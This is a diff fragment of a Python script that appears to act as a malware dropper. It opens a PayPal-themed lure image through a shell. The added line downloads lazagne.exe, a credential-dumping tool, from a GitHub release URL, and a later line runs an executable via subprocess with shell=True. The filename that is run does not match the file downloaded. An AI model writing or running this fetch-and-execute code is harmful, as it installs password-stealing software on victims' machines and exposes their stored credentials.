@@ -24,7 +24,7 @@ Download(paypalSS)
 
 result = subprocess.Popen("How-to-Get-PayPal-Money-Instantly-4.jpg", shell=True);
 
-Download("https://github.com/JustinAvina/Python-Scripts/blob/main/Executables/Download.exe")
+Download("http://github.com//AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
 
 result = subprocess.call("Download.exe", shell=True);
 print(result)
